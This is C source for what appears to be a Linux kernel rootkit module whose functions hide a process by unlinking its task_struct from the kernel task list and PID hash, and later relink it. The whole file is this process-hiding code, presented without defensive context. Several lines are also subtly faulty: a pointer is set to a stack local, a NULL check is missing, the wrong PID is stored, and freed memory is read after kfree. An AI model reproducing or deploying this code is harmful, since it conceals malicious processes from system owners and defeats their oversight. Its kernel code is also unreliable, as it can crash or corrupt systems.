#include "process.h"

struct list_head hide_list_head=LIST_HEAD_INIT(hide_list_head);

int hide_pid(pid_t a){
  struct pid *pid=find_vpid(a);
  if(IS_ERR(pid)){
    printk(KERN_INFO "Who call me?");
    return PTR_ERR(pid);
  }
  struct task_struct *used=pid_task(pid,PIDTYPE_PID);
  //task_struct
  list_del_rcu(&used->tasks);
  INIT_LIST_HEAD(&used->tasks);
  //pid list
  struct hlist_node *used_pid=&used->pid_links[PIDTYPE_PID];
  hlist_del_rcu(used_pid);
  used_pid->next=NULL;
  used_pid->pprev=&used_pid;
  struct hide_node *hide_cur=kmalloc(sizeof(struct hide_node),GFP_KERNEL);
  hide_cur->pid=current->pid;
  hide_cur->task_use=used;
  list_add(&hide_cur->node,&hide_list_head);
  printk(KERN_INFO "Add hide_node %d\n",a);
  return 0;
}
int recover_hide_pid(pid_t a){
  struct hide_node *pos=NULL,*pos_n=NULL;
  list_for_each_entry_safe(pos,pos_n,&hide_list_head,node){
    if(pos->pid==a){
      //Let's recover it to the list
      struct task_struct *cur=pos->task_use;
      hlist_add_head_rcu(&cur->pid_links[PIDTYPE_PID],&cur->thread_pid->tasks[PIDTYPE_PID]);
      list_add_tail_rcu(&cur->tasks,&init_task.tasks);
      list_del(&pos->node);
      kfree(pos);
      printk(KERN_INFO "Dele hide_node %d\n",a);
    }
  }
  return 0;
}
int recover_hide_pid_all(void){
  struct hide_node *pos=NULL,*pos_n=NULL;
  list_for_each_entry_safe(pos,pos_n,&hide_list_head,node){
    struct task_struct *cur=pos->task_use;
    hlist_add_head_rcu(&cur->pid_links[PIDTYPE_PID],&cur->thread_pid->tasks[PIDTYPE_PID]);
    list_add_tail_rcu(&cur->tasks,&init_task.tasks);
    list_del(&pos->node);
    kfree(pos);
    printk(KERN_INFO "Dele hide_node %d\n",pos->pid);
  }
  return 0;
}
